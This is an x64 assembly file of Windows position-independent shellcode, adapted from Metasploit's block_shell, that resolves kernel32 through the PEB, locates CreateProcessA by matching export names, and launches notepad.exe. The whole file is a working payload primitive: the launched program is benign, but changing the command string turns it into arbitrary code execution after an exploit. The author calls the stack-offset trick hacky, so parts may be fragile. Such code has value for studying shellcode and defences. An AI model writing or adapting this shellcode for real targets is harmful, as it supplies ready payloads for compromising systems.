; BASEx64 PI SCODE using CreateProcessA - hidden by @bb_hacks
; I believe the euphemism for code quality here is 'rough'!
; Based on https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x64/src/block/block_shell.asm 
; and https://emsea.github.io/2017/12/04/import-by-hash/ and many other bits stolen from everywhere. If I have used your code without credit
; its not deliberate, I tried many things to get this to work and am not sure what is from where. Please let me know and I will credit.
; Very hacky. 

BITS 64

global main
section .text


main:



;================================
;Find Kernel32 Base
;================================

    ; Obtain base of kernel32.dll in rbx
	cdq
	mov rax,[gs:rdx+0x60] ;PEB
	mov rax,[rax+0x18] ;PEB.Ldr
	mov rsi,[rax+0x10] ;PEB.Ldr->InMemOrderModuleList
	lodsq
	mov rsi,[rax]
	mov rbx,[rsi+0x30] ;kernel32.dll base address
    
	
  find_export_dir:
    ;.e_lfanew   = 3Ch
    ;.data_dir_0 = 88h

    ; Obtain IMAGE_EXPORT_DIRECTORY address in rax
    mov eax, [rbx + 0x3C]
    mov eax, [rbx + rax + 0x88]
    add rax, rbx


  read_export_dir:
    ;.export_names_num  = 18h
    ;.export_funcs_addr = 1Ch
    ;.export_names_addr = 20h
    ;.export_ords_addr  = 24h

    ; Obtain info from IMAGE_EXPORT_DIRECTORY
    mov r13d, [rax + 0x1c] ; AddressOfFunctions
    mov r14d, [rax + 0x20] ; AddressOfNames
    mov r15d, [rax + 0x24]  ; AddressOfNameOrdinals
    mov r12d, [rax + 0x18]  ; NumberOfNames
    add r13, rbx
    add r14, rbx
    add r15, rbx


    xor rcx, rcx
  find_exports:
    mov esi, [r14 + rcx*4] ; use rcx to index AddressOfNames getting cur func name RVA
    add rsi, rbx
	inc ecx
	cmp dword [rsi],   0x61657243 ;Crea [sidenote - if you use ESI instead of RSI then you are going to have a bad day]
	jne find_exports
	cmp dword [rsi+8], 0x7365636f ;oces [go on, ask me how I know ...!]
	jne find_exports
	dec ecx
    xor eax, eax           ; not needed if eax is already 0 but safety first!
    mov ax, [r15 + rcx*2]  ; get export's index into AddressOfFunctions
    mov eax, [r13 + rax*4] ; get export address rva from AddressOfFunctions
    add rax, rbx
	mov rbp, rax
	
	
;================================
;Zero Memory
;================================

  xor r8, r8                  ; Clear r8 for all the NULL's we need to push
  push byte 13                ; We want to place 104 (13 * 8) null bytes onto the stack
  pop rcx                     ; Set RCX for the loop
push_loop:                    ;
  push r8                     ; push a null qword
  loop push_loop              ; keep looping untill we have pushed enough nulls
   

;================================
;Call CreateProcessA
;================================

;Absolutely horrible hacky way of doing this. Yes, I'm sure there is a better way, please make a PR!

mov rcx,rsp 
call dbCommandline		;call empty subroutine
sub esp,8				;move stack
mov edx, [esp]			;pass return address from stack to edx
add esp,8				;rebase stack
add edx,0x39			;add offset to dbCommandline



mov word [rsp+84], 0x0101   ; Set the STARTUPINFO Structure's dwFlags to STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW
lea rax, [rsp+24]           ; Set RAX as a pointer to our STARTUPINFO Structure
mov byte [rax], 104         ; Set the size of the STARTUPINFO Structure
mov rsi, rsp                ; Save the pointer to the PROCESS_INFORMATION Structure 


push rsi                    ; Push the pointer to the PROCESS_INFORMATION Structure 
push rax                    ; Push the pointer to the STARTUPINFO Structure
push r8                     ; The lpCurrentDirectory is NULL so the new process will have the same current directory as its parent
push r8                     ; The lpEnvironment is NULL so the new process will have the same enviroment as its parent
push r8                     ; We dont specify any dwCreationFlags 
push r8                     ; Set bInheritHandles to FALSE in order to inheritable all possible handle from the parent
mov r9, r8                  ; Set fourth param, lpThreadAttributes to NULL
                              ; r8 = lpProcessAttributes (NULL)
                              ; rdx = the lpCommandLine to point to "cmd",0
mov rcx, r8                 ; Set lpApplicationName to NULL as we are using the command line param instead
push r9
push r9
push r9
push rdx

;call CreateProcessA
call RBP				; call CREATE_PROCESSA

dbCommandline:
ret
db 'notepad.exe'